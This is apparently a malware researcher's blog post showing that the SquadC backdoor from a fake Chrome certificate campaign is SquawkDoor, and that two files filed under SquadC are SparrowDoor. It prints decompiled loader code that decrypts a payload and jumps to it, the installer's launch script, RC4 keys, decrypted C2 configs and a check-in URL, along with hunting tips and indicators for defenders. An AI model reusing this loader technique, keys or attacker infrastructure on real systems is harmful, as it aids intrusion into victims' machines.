---
title: "SquadC is SquawkDoor, and one of its installers is SparrowDoor"
date: 2026-11-13
slug: "squadc-is-squawkdoor"
description: "Check Point's SquadC backdoor from the fake Chrome certificate campaign is the SquawkDoor that Positive Technologies described in August. Here are its loader, both config versions, three installers' configs as text, and the SQD1 framing. Two files listed as SquadC turn out to be SparrowDoor."
tags: ["squawkdoor", "squadc", "sparrowdoor", "famoussparrow", "dll-sideloading", "config-extraction", "windows"]
sample:
  family: "SquawkDoor (SquadC)"
  sha256: "e9f2f42ea3611096879f4152a7d78bb3a78a4dbead1c3b7e366dce485207551f"
  source: "[MalwareBazaar](https://bazaar.abuse.ch/sample/e9f2f42ea3611096879f4152a7d78bb3a78a4dbead1c3b7e366dce485207551f/)"
toc: true
---

The backdoor that Check Point Research calls SquadC creates a mutex named `Global\squadc_single_instance`, and Positive Technologies (PT) quoted the same mutex in August when it named the backdoor SquawkDoor. They are one family. Check Point's [report on CopperDragon's Sparrow framework](https://research.checkpoint.com/2026/not-all-that-glitters-is-gold-tracking-copperdragons-sparrow-framework-around-the-globe/) (November 10) lists ten SquadC files from the SilentDelivery watering-hole campaign, in which compromised sites show a fake Chrome certificate error and offer a "Certificate Fix" MSI. Seven of the ten are on MalwareBazaar. Five of those seven really are SquadC. The other two, an installer and its sideloaded DLL, belong to SparrowDoor: the installer's payload decrypts with PT's SparrowDoor key, and its config points at three hosts that Check Point lists for the campaign.

Positive Technologies' [August 21 report](https://positechglobal.com/en/research/pt-esc-threat-intelligence/famoussparrow-attacks-with-updated-sparrowdoor-backdoor-and-new-squawkdoor-backdoor/) already covers the backdoor in detail: the RC4 key, a config structure, the protocol and the command set. Check Point links a copy of that report but still calls SquadC previously undocumented. What I can add is the evidence that the two names mean one thing, the configs of all three SquawkDoor installers as text, an older and shorter config format, the byte order of the wire header, and a [config extractor](https://github.com/stateless-re/tools/tree/main/families/squawkdoor). I use PT's name, SquawkDoor, because it came first. As always here, nothing was executed: payloads were decrypted in Python and read with Ghidra and capstone.

## What I found

- Three MSIs on MalwareBazaar install SquawkDoor. Two of them (German and Indonesian) carry byte-identical payload files. The Taiwanese one carries an older build, compiled March 17, 2026, whose config is 388 bytes instead of 396 and has no anti-analysis or browser-wait flags. Its VM checks are compiled in, but I found nothing that calls them.
- The configs give two C2 addresses, `103.141.235[.]123:443` (March build) and `135.136.135[.]54:443` (May build). Both builds use the magic tag `XlocmwW` and the check-in URL `hxxps://pplpp.microsfot[.]vip/register-ip`.
- The installer `e5f7bbfc…` and the DLL `b60404c1…`, both listed by Check Point as SquadC, are the SparrowDoor variant from PT's report and its loader. PT's SparrowDoor key, stored in the DLL, decrypts the installer's payload, and the config names `astorialaza[.]com:26653`, `165.154.227[.]16:26653` and `aistei[.]com:443`.
- The installers were built with Python's `msilib`, and their non-ASCII text is stored in GBK, the Simplified Chinese code page, even in the German one: "zurück" is stored as `7a 75 72 a8 b9 63 6b`.
- The `SQD1` frame header is big-endian (the magic goes through `htonl`), and the TLS around it comes from a TLS 1.2/1.3 stack linked into the binary, built on LibTomCrypt, not from Windows.

## Two reports, one mutex

The overlap is visible before opening any file. All seven files I could download from Check Point's SquadC table are also in PT's IOC table. For five of them (the installers `b379d07b…`, `e9f2f42e…` and `f51dc5e1…`, and the loaders `f23e5391…` and `8bbc395a…`) PT's label is SquawkDoor. PT also lists the four installers' embedded cabinets, and the `AppCab` streams I extracted hash to those entries. PT gives the backdoor's mutex as `squadc_single_instance`. Check Point says the name SquadC "is derived from an internal reference left by the author in the sample" and shows it only as a screenshot. Both decrypted SquawkDoor images I recovered have this string next to the persistence and cleanup strings. Here it is in the March build's decrypted stage 2 (offsets in the restored image are 0x400 lower):

```text
00031d10: 6e00 0000 5769 6e64 6f77 7355 7064 6174  n...WindowsUpdat
00031d20: 6541 7373 6973 7400 6170 702e 6578 6500  eAssist.app.exe.
  ...
00031dc0: 476c 6f62 616c 5c73 7175 6164 635f 7369  Global\squadc_si
00031dd0: 6e67 6c65 5f69 6e73 7461 6e63 6500 0000  ngle_instance...
```

The command sets in the two reports also match one for one (codes 2 to 8 and 10). Two names, one backdoor.

Where the reports disagree is on two files. Check Point lists the installer `e5f7bbfc…` and the DLL `WTSAPI32.dll` (`b60404c1…`) as a SquadC installer and loader. PT's IOC table lists the same two hashes as "MSI SparrowDoor" and "SparrowDoor loader". The files decide it, and I'll get to them after the SquawkDoor chain.

## The installers share one builder and one code page

The four installers are ordinary MSI databases with an embedded cabinet stream named `AppCab`. Each cabinet holds three files: a signed executable, a DLL for it to sideload, and an encrypted payload named after the executable without `.exe`.

| Installer | Folder under `%LOCALAPPDATA%` | Popup language | Payload trio |
|---|---|---|---|
| `b379d07b…` | `WinOx` | Traditional Chinese | `hhc` `1c28aaa5…`, `hhc.exe`, `MSVCR110.dll` `f23e5391…` |
| `e9f2f42e…` | `WinAz` | Indonesian | `hhc` `83bc97e0…`, `hhc.exe`, `MSVCR110.dll` `8bbc395a…` |
| `f51dc5e1…` | `WinXA` | German | same three files as `e9f2f42e…` |
| `e5f7bbfc…` | `WinxA` | English | `NisaSrv` `3cb6f80c…`, `NisaSrv.exe`, `WTSAPI32.dll` `b60404c1…` |

`hhc.exe` is ESET's command-line tool `ecmd.exe` 8.0.312.0, with a valid ESET signature. It imports `_except_handler4_common` and `__crtSetUnhandledExceptionFilter` from `MSVCR110.dll`, which is why the malicious DLL takes that name. `NisaSrv.exe` is an Avast Antivirus Installer (25.8.10387.0, signed by Gen Digital) that imports four functions from `WTSAPI32.dll`.

All four MSIs come from the same builder. Their SummaryInformation names the creating application as `Python MSI Library`, Python's `msilib` module. Each has the Manufacturer `Hello World`, the ProductVersion `5.4.2`, a VBScript custom action called `ShowPopup` that shows a "certificate installed" message box, and a second one that starts the executable:

```vb
Set sh = CreateObject("WScript.Shell") : sh.CurrentDirectory = Session.Property("INSTALLDIR") : sh.Run Chr(34) & Session.Property("INSTALLDIR") & "hhc.exe" & Chr(34), 1, False
```

That shared builder is probably why the SparrowDoor installer ended up in a SquadC column: from the outside, the four MSIs look the same.

The popup text gave me the first wrong turn. The Taiwanese installer's message, decoded as Big5 (the Traditional Chinese code page), fails at byte `0x95`. Decoded as GBK, it reads 証書安裝成功,請返回瀏覽器操作!, which is the Traditional Chinese text PT quotes, stored in the Simplified Chinese code page. The German installer has the same habit:

```text
7a 75 72 a8 b9 63 6b 2c    zurück,
```

In Windows-1252 the "ü" would be the single byte `fc`. Here it is `a8 b9`, its GBK encoding. Both messages with non-ASCII characters went through code page 936 on the way in (the English and Indonesian ones are plain ASCII and can't show it). The string pools don't declare a code page of their own (the field is 0), and GBK is what Windows produces under code page 936, so I think the builder ran on a machine whose ANSI code page is 936, the default for Simplified Chinese Windows. That says something about the build environment and nothing about who sat at it.

## The loader reads, decrypts and jumps inside two CRT exports

The two `MSVCR110.dll` builds (`f23e5391…` compiled February 26, 2026 and `8bbc395a…` compiled May 6, 2026) have the same logic at the same offsets. On process attach, `DllMain` takes the host's path, cuts off the last four characters and allocates a 2 MB heap buffer:

```c
// DllMain, process attach (Ghidra output, renamed)
GetModuleFileNameA(NULL, g_path, 0x104);   // ...\WinOx\hhc.exe
g_path[len - 4] = '\0';                    // ...\WinOx\hhc     (1)
g_buf = HeapAlloc(GetProcessHeap(), 0, 0x200000);
```

At (1) the payload path is derived from the host's own name, which explains why the SquawkDoor payload is named after the executable without its extension (`hhc`). The SparrowDoor installer follows the same naming (`NisaSrv`), though I didn't trace its loader. The two hijacked exports do the rest, when ESET's tool calls them:

```c
// __crtSetUnhandledExceptionFilter (error handling removed)
h = CreateFileA(g_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0x80, NULL);
ReadFile(h, g_buf, 0x200000, &g_len, NULL);
CloseHandle(h);

// _except_handler4_common
rc4(g_buf, g_len, "Hg5th5324Ve");                       // (2)
VirtualProtect(g_buf, 0x200000, PAGE_EXECUTE_READWRITE, &old);
((void (*)(void *))g_buf)(g_buf);                        // (3)
```

At (2) the key is the 11-byte string PT published, stored in plain text in both DLLs. The RC4 is written out inline, which is why the decompiler shows the key schedule as `key[i % 0xb]`. At (3) the whole buffer becomes RWX and the loader calls its first byte, passing the buffer's own address.

`CreateFileA`, `ReadFile` and `GetModuleFileNameA` are not in the import table, and all five APIs on this path are called through hash lookups (even `CloseHandle`, and in the February build `VirtualProtect`, both of which the DLL also imports). `HeapAlloc` is imported and called directly. For the lookups, the DLL walks the loader's module list and hashes every export name with an FNV-1a variant:

```text
h = 0x5D8CED15
for c in name: h = (h ^ c) * 0x024151A3   (mod 2^32)
```

That matches PT's description. I recomputed the five hashes the loader uses rather than trusting names from the decompiler: `0x8E31CD1E` is `CreateFileA`, `0xE5C13BC3` is `ReadFile`, `0xD6BF6CD5` is `CloseHandle`, `0x7E67B7A3` is `VirtualProtect` and `0x8922ECCD` is `GetModuleFileNameA`.

## Stage 2 is a shellcode stub and a PE without its magic

The decrypted `hhc` begins with x86 code: `55 8B EC 64 A1 30 00 00 00` is `push ebp; mov ebp, esp; mov eax, fs:[30h]`, the start of a walk from the PEB to the loaded modules. The stub compares each module name against `KERNEL32.DLL` one UTF-16 character at a time, finds `GetProcAddress` by comparing export names byte by byte, and builds the string `LoadLibraryA` on the stack. It then reads the PE file at its argument plus `0x400` and maps it at its argument plus `0x100000`, inside the same 2 MB buffer.

Searching the March build's decrypted blob for `MZ` and `PE\0\0` gave two hits near `0x30AD9`. They looked like an embedded image. They were code instead: `B8 4D 5A 00 00 66 39 05 00 00 40 00` is `mov eax, 'MZ'; cmp [0x400000], ax`, the C runtime checking its own image base. The real image at `0x400` has both magics overwritten with zeros, and nothing else changed (March build shown; the May build is the same with `e_lfanew` 0x118):

```text
00000430: 0000 0000 0000 0000 0000 0000 1001 0000  ................   e_lfanew = 0x110
00000510: 0000 0000 4c01 0500 5021 b969 0000 0000  ....L...P!.i....   "PE\0\0" zeroed, then i386, 5 sections
```

Writing `MZ` and `PE\0\0` back gives a valid PE file. For the May payload that produces `98c919734910…`, the exact SquawkDoor hash PT lists, so PT carved it the same way. The March payload gives `9120968808b2…`, which appears in neither report. Check Point mentions a "three-stage process" without listing the stages. I read them as the sideloaded DLL, the stub and the backdoor.

## Two config versions, three installers

PT says the config is RC4-encrypted with the same key, and gives a structure that adds up to 0x18C bytes. In the May build, the code that loads it is short:

```text
40165c  mov ecx, 0x63          ; 0x63 dwords = 0x18C bytes
401667  mov esi, 0x458000      ; start of .data
4016b0  rep movsd              ; copy to the stack
4016fa  div esi                ; esi = 0xB: key[i % 11], RC4 key schedule, inlined
4017d0  cmp ebx, 0x18c         ; RC4 over 0x18C bytes
4017f8  call 0x433aa0          ; copy c2 over "127.0.0.1:8443"
40180b  call 0x433aa0          ; copy magic_tag over "changeme"
```

The config is the first 396 bytes of `.data`. Decrypted:

| Offset | Size | Field | Value (May build) |
|---|---|---|---|
| 0x000 | 0x40 | `c2` | `135.136.135[.]54:443` |
| 0x040 | 0x40 | `magic_tag` | `XlocmwW` |
| 0x080 | 0x100 | `ping_url` | `hxxps://pplpp.microsfot[.]vip/register-ip` |
| 0x180 | 4 | `beacon_interval_minutes` | 10 |
| 0x184 | 4 | `need_browser_waiting` | 0 |
| 0x188 | 4 | `anti_analysis_enabled` | 1 |

I ran the same decryption on the March build from the Taiwanese installer. The strings came out clean (`103.141.235[.]123:443`, `XlocmwW`, the same ping URL, interval 10), but the two flags read 430880728 and 3324418678. A flag doesn't hold numbers like that. The copy loop in that build explains it: `mov ecx, 0x61; mov esi, 0x43f000`, so 0x61 dwords, 388 bytes. The older config stops after the interval. The two "flags" I had decrypted were RC4 keystream applied to whatever follows the config in `.data`.

The missing fields match missing code. The March build has no browser list (`chrome.exe`, `msedge.exe`, `brave.exe` and the rest appear only in the May build). It does contain the twelve VM checks, as a table of `{name, function}` pairs at `0x43D4D8` that starts with "Memory Size", "Disk Size" and "VMware Registry". No address anywhere in that image points into the table, and the check functions are referenced only from it. In the May build, the table is read at `0x431798` by the scoring function that `main` calls when `anti_analysis_enabled` is set. I think the March build carries the checks as dead code: written, but not yet wired to a switch.

One part of PT's description doesn't fit either build. PT says the backdoor resolves its imports with a custom hash seeded with `0x753AB21D` and multiplied by `0xA3AB09`. Neither constant, nor any entry of the 12-value table PT prints, appears in either image or in either decrypted stage 2. Both images use an ordinary import table (133 imports in the May build). PT analyzed more samples than these, including the one delivered by LNK, so the hash may belong to a build I don't have.

The three SquawkDoor installers, side by side:

| Installer | Payload image | Compiled (PE header) | Config | C2 |
|---|---|---|---|---|
| `b379d07b…` (Taiwan) | `9120968808b2…` | 2026-03-17 09:39:28 | v1, 388 bytes | `103.141.235[.]123:443` |
| `e9f2f42e…` (Indonesia) | `98c919734910…` | 2026-05-14 06:09:07 | v2, 396 bytes, anti-analysis on | `135.136.135[.]54:443` |
| `f51dc5e1…` (Germany) | `98c919734910…` | 2026-05-14 06:09:07 | v2, same as above | `135.136.135[.]54:443` |

All three use the magic tag `XlocmwW` and `hxxps://pplpp.microsfot[.]vip/register-ip`. Both C2 addresses are in Check Point's and PT's indicator lists. PT shows one decrypted config as a screenshot; neither report gives the three configs as text or says which build each belongs to.

The [extractor](https://github.com/stateless-re/tools/tree/main/families/squawkdoor) takes an MSI, a dropped `hhc` payload, a decrypted stage 2 or a carved image. It unpacks the MSI's cabinet itself, recognizes the stub by its first nine bytes after RC4, restores the PE magics, and reads the config length from the `mov ecx, N / mov esi, .data` pair. It accepts the two lengths seen so far, 0x61 and 0x63 dwords. It reports all three installers above and rejects the SparrowDoor installer.

## SQD1 on the wire, inside a TLS stack linked into the binary

PT describes each message as a `uint32` magic `SQD1`, a `uint16` command code, a `uint16` error flag and a `uint32` body length, without byte order. In the binary the magic is the immediate `0x53514431`, which in memory is the bytes `31 44 51 53`, or "1DQS". It doesn't stay that way:

```text
430a59  mov edi, [0x445224]     ; WS2_32!htonl
430a5f  push 0x53514431
430a67  call edi                ; -> 53 51 44 31 = "SQD1" on the wire
  ...
430990  call [0x44521c]         ; WS2_32!ntohl on the received header
430996  cmp eax, 0x53514431
```

The send side converts the magic with `htonl` before writing it, and the receive side converts the first four bytes back with `ntohl` before comparing. The command code and error flag go through `htons` and the length through `htonl`, so the header is big-endian throughout. Replies to commands use code 100 (`0x64`) with the error flag set or clear, with two exceptions: the screenshot goes back under code 7, and a heartbeat (code 8) never reaches the dispatcher. `main` answers it with an empty code-8 frame.

The header is never visible on the network anyway, because it travels inside TLS. The TLS is not SChannel. Neither image imports WinHTTP, WinINet or `secur32`; networking is WS2_32 only. Both images contain `LibTomCrypt 1.17`, the TLS 1.2 key derivation labels `master secret` and `key expansion`, the TLS 1.3 labels `tls13 `, `derived` and `c hs traffic`, `TLS 1.3, server CertificateVerify`, six finite-field Diffie-Hellman primes in hex (the five RFC 7919 `ffdhe` groups and an RFC 5114 group), and parameters for the curves secp256k1, P-256, P-384 and P-521. That combination matches TLSe, a small open-source TLS library built on LibTomCrypt. I haven't compared code with it, so treat the library's name as an inference. The practical point holds either way: the ClientHello comes from a bundled stack, not from Windows, so it should fingerprint differently from browsers and system services on the same host. The HTTPS check-in to `/register-ip` very likely goes through the same stack too, since the request is built as raw text (`POST %s HTTP/1.1`) and there is no other HTTP client in the import table. I didn't trace that call.

## The other column: e5f7bbfc and b60404c1 are SparrowDoor

The fourth installer's payload file, `NisaSrv`, starts with `91 91`. PT describes a SparrowDoor loader that treats a payload starting `0x91 0x91` (or `0xD1 0x92`) as a first run and decrypts it with RC4 and the key `oWbgvv5234$43gh`. That key is a plain string in the DLL `b60404c1…`, and SquawkDoor's key does not decrypt the payload file. PT's key, applied to everything but the last 0x31A bytes, gives PT's reflective-loader header: entry point RVA `0x35D07`, 5 sections, relocations at `0x6E000`, imports at `0x56E68`, image base `0x400000`.

The last 0x31A bytes are PT's SparrowDoor config structure (three 0x86-byte C2 entries, then path, service name, key half and two integers), and decrypt to:

```text
c2[0]        astorialaza.com : 26653   transport 4
c2[1]        165.154.227.16  : 26653   transport 4
c2[2]        aistei.com      : 443     transport 4
target_path  C:\ProgramData\Platform
service      NisaSrv
key_part     fdibnvvgbVUGV
ints         10, 1200
```

The decrypted image contains none of SquawkDoor's markers: no `squadc`, no `XlocmwW`, no `SQD1` immediate, no `Hg5th5324Ve`, no LibTomCrypt. The DLL `b60404c1…` has none of the MSVCR110 loader's hash constants either. These two files are SparrowDoor.

That doesn't undermine Check Point's campaign picture, only the label. Check Point itself says SilentDelivery sometimes delivered "a variant of SparrowDoor" instead of SquadC, and `astorialaza[.]com`, `165.154.227[.]16` and `aistei[.]com` all appear in Check Point's SilentDelivery infrastructure list. The installer belongs to the campaign. It just carries the other backdoor.

## What I couldn't determine

Three of Check Point's ten SquadC hashes (`715c2066…` and `f44159be…`, both CertFixer.msi, and the loader `054c0ffb…`) are not on MalwareBazaar, so I can't say which backdoor they carry. I don't have the LNK-delivered build PT analyzed, which is where I'd look for the table-driven API hash. I read the configs but contacted none of the hosts, so I don't know what `/register-ip` returns or whether `XlocmwW` is still accepted. And the reading of `0x431790` as "scores the twelve checks against a threshold" rests on PT's description (seven of twelve) plus the table reference. I didn't trace the threshold constant myself.

## Hunting

Look for these:

- a signed `ecmd.exe` running as `hhc.exe` (or as any name other than its own) from a short `Win??` folder under `%LOCALAPPDATA%` or from `%TEMP%`, next to an `MSVCR110.dll` that isn't Microsoft's;
- a 2 MB private RWX region in that process whose offset `0x400` holds a PE header with `MZ` and `PE\0\0` zeroed (the stub maps the image elsewhere in the buffer and doesn't wipe the copy; I haven't checked whether the backdoor does later);
- the mutex `Global\squadc_single_instance`, or a `Run` value named `WindowsUpdateAssist`;
- an HTTPS POST of `{}` to `/register-ip` with the truncated user agent `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36` (no `KHTML` or browser token after it), which is in both images and in the request PT shows.

## Indicators

| SHA-256 | Role |
|---|---|
| `b379d07ba81d4190490d9893b2d6d830ff594e042dce26053ef07794d0403787` | MSI, SquawkDoor, Taiwan (Traditional Chinese popup) |
| `e9f2f42ea3611096879f4152a7d78bb3a78a4dbead1c3b7e366dce485207551f` | MSI, SquawkDoor, Indonesia |
| `f51dc5e1848daee4e607d46faa25033e1151060cd3482ad4439754440d6c4c01` | MSI, SquawkDoor, Germany |
| `e5f7bbfc187264336dea5dfebfb5a7dd1e7fcdcc9692db55fbe6eb4d28f027bc` | MSI, SparrowDoor (listed as SquadC by Check Point) |
| `f23e5391656b178bc0ab510b0fca6ffbd963cf94870c82a5920f0f338f561f18` | `MSVCR110.dll` SquawkDoor loader (in `b379d07b…`) |
| `8bbc395a7a0faff074c6e31c7da37bf1540a4e7ec3d80870f8d6bd1f5d4cecbb` | `MSVCR110.dll` SquawkDoor loader (in `e9f2f42e…`, `f51dc5e1…`) |
| `b60404c1299e69df029d9817dcf69f9fe325ecc990e16bc7758f56ce5714184b` | `WTSAPI32.dll` SparrowDoor loader (listed as SquadC by Check Point) |
| `1c28aaa57223794ad34b0ebc063dc450187425e5c9b38a2c32276d8ea34c9f27` | `hhc`, encrypted SquawkDoor (March build) |
| `83bc97e0a7da7030cac699a239b7071e84a388bc235a0cd9d3d01a5639915f08` | `hhc`, encrypted SquawkDoor (May build) |
| `9120968808b262f030c1dbb37cafa0706d7d110e957655676396e0d5299953ac` | SquawkDoor image, March build, magics restored |
| `98c919734910cc7a825f9b5b4f7390831ba32cf054a01b5b7bf5e37a352f9155` | SquawkDoor image, May build, magics restored |
| `3cb6f80cf7753c16d23f493307c54b302f849daa5211415aa55781f3fdf153e6` | `NisaSrv`, encrypted SparrowDoor |
| `fafb6ffd3ffcf414b702354f62a5216351af4566ed61ece7784846a6938bb8d9` | `hhc.exe`, legitimate ESET `ecmd.exe` used as sideloading host |
| `8d78f002f6830ba67cf63699399f2755af443f44b815952f7ed0eb8d65e3e132` | `NisaSrv.exe`, legitimate Avast installer used as sideloading host |

The two image hashes are of the stage 2 data from offset `0x400` with the two magics restored, so they only match files carved the same way. The two signed host executables are legitimate files; they are listed to give context, not to be blocked.

| Network indicator | From |
|---|---|
| `103.141.235[.]123:443` | SquawkDoor C2, March build |
| `135.136.135[.]54:443` | SquawkDoor C2, May build |
| `hxxps://pplpp.microsfot[.]vip/register-ip` | SquawkDoor check-in URL, both builds |
| `astorialaza[.]com:26653` | SparrowDoor C2 |
| `165.154.227[.]16:26653` | SparrowDoor C2 |
| `aistei[.]com:443` | SparrowDoor C2 |

## ATT&CK

| ID | Technique | In these samples |
|---|---|---|
| T1189 | Drive-by Compromise | Fake certificate-error page on compromised sites (from both reports) |
| T1218.007 | System Binary Proxy Execution: Msiexec | Certificate-fix MSI installs and launches the payload trio |
| T1574.001 | Hijack Execution Flow: DLL | `MSVCR110.dll` next to ESET `ecmd.exe`; `WTSAPI32.dll` next to an Avast installer |
| T1027.007 | Obfuscated Files or Information: Dynamic API Resolution | FNV-1a variant over export names in the loader |
| T1140 | Deobfuscate/Decode Files or Information | RC4 with `Hg5th5324Ve` over the payload and the config |
| T1620 | Reflective Code Loading | Stub maps a PE with zeroed magics inside an RWX heap buffer |
| T1547.001 | Registry Run Keys / Startup Folder | `WindowsUpdateAssist` Run value |
| T1497.001 | Virtualization/Sandbox Evasion: System Checks | Twelve VM checks, gated by `anti_analysis_enabled` (May build) |
| T1573.002 | Encrypted Channel: Asymmetric Cryptography | `SQD1` frames inside a TLS stack linked into the binary |
| T1113 | Screen Capture | Command 7 |

## Ending

Check Point found the backdoor's name in its own mutex, and that string is still the quickest way to tell the two families apart in this campaign: `squadc_single_instance` is in every SquawkDoor image here and in none of the SparrowDoor ones. The installers can't help you, because one builder makes both kinds. Hunt the two loaders separately, by `MSVCR110.dll` next to ESET's `ecmd.exe` and by `WTSAPI32.dll` next to an Avast installer, because what the MSI drops decides which backdoor you're dealing with.

## Credits and further reading

- Check Point Research, [Not All That Glitters Is Gold: Tracking CopperDragon's Sparrow Framework Around the Globe](https://research.checkpoint.com/2026/not-all-that-glitters-is-gold-tracking-copperdragons-sparrow-framework-around-the-globe/) (November 10, 2026): the SilentDelivery campaign, the SquadC name, the hashes I started from.
- Positive Technologies, [The sparrow that chirped too loud: FamousSparrow attacks using updated SparrowDoor and the new SquawkDoor backdoor](https://positechglobal.com/en/research/pt-esc-threat-intelligence/famoussparrow-attacks-with-updated-sparrowdoor-backdoor-and-new-squawkdoor-backdoor/) (August 21, 2026): the first description of SquawkDoor, its key, config struct, protocol and commands, and of the SparrowDoor loader and config format I used to identify `e5f7bbfc…`.
- Samples from [MalwareBazaar](https://bazaar.abuse.ch/browse/tag/FamousSparrow/).
- Extractor: [`families/squawkdoor`](https://github.com/stateless-re/tools/tree/main/families/squawkdoor).
